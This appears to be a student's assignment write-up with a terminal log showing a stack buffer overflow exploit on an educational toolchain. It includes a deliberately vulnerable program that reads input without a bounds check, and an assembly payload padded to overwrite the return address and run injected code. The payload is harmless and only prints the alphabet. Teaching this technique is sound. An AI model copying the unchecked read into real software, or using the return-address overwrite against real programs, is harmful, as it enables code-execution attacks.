This assignment is relative easier. Once I understand how the stack frame arranged
when calling a function, simply padding the payload assembly code to overwrite
the return address would results in a worm like attack. following scripts show how
I did it. The modified payload ex1.ass code and my vulnerable program also included
in the archive.

script:
17:32 ~/assignment > cat ex1.ass
      .makeexe

      load r1, 'A'
loop: type r1
      add  r1, 1
      comp r1, 'Z'
      jcond leq, loop
      type '\'
      .data 0xABCD1234
      .data 0xABCD1234
      .data 0xABCD1234
      .data 0xABCD1234
      .data 0xABCD1234
      .data 0x7FFFFFEE
17:33 ~/assignment > assemble -l ex1.ass
   LOOP         = 00000001, relative
        1:       .makeexe
        2: 
        3:       load r1, 'A'
   0000: 02100041 
        4: loop: type r1
   0001: 88010000 
        5:       add  r1, 1
   0002: 0C100001 
        6:       comp r1, 'Z'
   0003: 2810005A 
        7:       jcond leq, loop
   0004: 3A3FFFFC 
        8:       type '\'
   0005: 88000027 
        9:       .data 0xABCD1234
   0006: ABCD1234 
       10:       .data 0xABCD1234
   0007: ABCD1234 
       11:       .data 0xABCD1234
   0008: ABCD1234 
       12:       .data 0xABCD1234
   0009: ABCD1234 
       13:       .data 0xABCD1234
   000A: ABCD1234 
       14:       .data 0x7FFFFFEE
   000B: 7FFFFFEE 
17:33 ~/assignment > cat worm.b
import "io"

let gets(s) be
{ let i=0;
  while true do
  { let c = inch();
    if c='\n' then break;
    byte i of s := c;
    i+:=1 }
  byte i of s := 0 }
 
let f() be
{ let line = vec 10;
  gets(line);
  for i = 0 to 11 do
  { out("byte i = %d\t line = %08x\t !line = %08x\n", i, line ! i, line+i) } }
    
let start () be
{ let a, b;
  f();
  out("not overwrite the return address\n") }

17:33 ~/assignment > prep worm
ok
17:33 ~/assignment > run worm
123456
byte i = 0	 line = 34333231	 !line = 7FFFFFEE
byte i = 1	 line = 00003635	 !line = 7FFFFFEF
byte i = 2	 line = 00000000	 !line = 7FFFFFF0
byte i = 3	 line = 00000000	 !line = 7FFFFFF1
byte i = 4	 line = 00000000	 !line = 7FFFFFF2
byte i = 5	 line = 00000000	 !line = 7FFFFFF3
byte i = 6	 line = 00000000	 !line = 7FFFFFF4
byte i = 7	 line = 00000000	 !line = 7FFFFFF5
byte i = 8	 line = 00000000	 !line = 7FFFFFF6
byte i = 9	 line = 00000000	 !line = 7FFFFFF7
byte i = 10	 line = 7FFFFFFD	 !line = 7FFFFFF8
byte i = 11	 line = 00000446	 !line = 7FFFFFF9
not overwrite the return address
17:33 ~/assignment > run worm -in=ex1.exe
A�
       Z(��?:'�4ͫ4ͫ4ͫ4ͫ4ͫ���
byte i = 0	 line = 02100041	 !line = 7FFFFFEE
byte i = 1	 line = 88010000	 !line = 7FFFFFEF
byte i = 2	 line = 0C100001	 !line = 7FFFFFF0
byte i = 3	 line = 2810005A	 !line = 7FFFFFF1
byte i = 4	 line = 3A3FFFFC	 !line = 7FFFFFF2
byte i = 5	 line = 88000027	 !line = 7FFFFFF3
byte i = 6	 line = ABCD1234	 !line = 7FFFFFF4
byte i = 7	 line = ABCD1234	 !line = 7FFFFFF5
byte i = 8	 line = ABCD1234	 !line = 7FFFFFF6
byte i = 9	 line = ABCD1234	 !line = 7FFFFFF7
byte i = 10	 line = ABCD1234	 !line = 7FFFFFF8
byte i = 11	 line = 7FFFFFEE	 !line = 7FFFFFF9
ABCDEFGHIJKLMNOPQRSTUVWXYZ'17:34 ~/assignment >
17:35 ~/assignment >
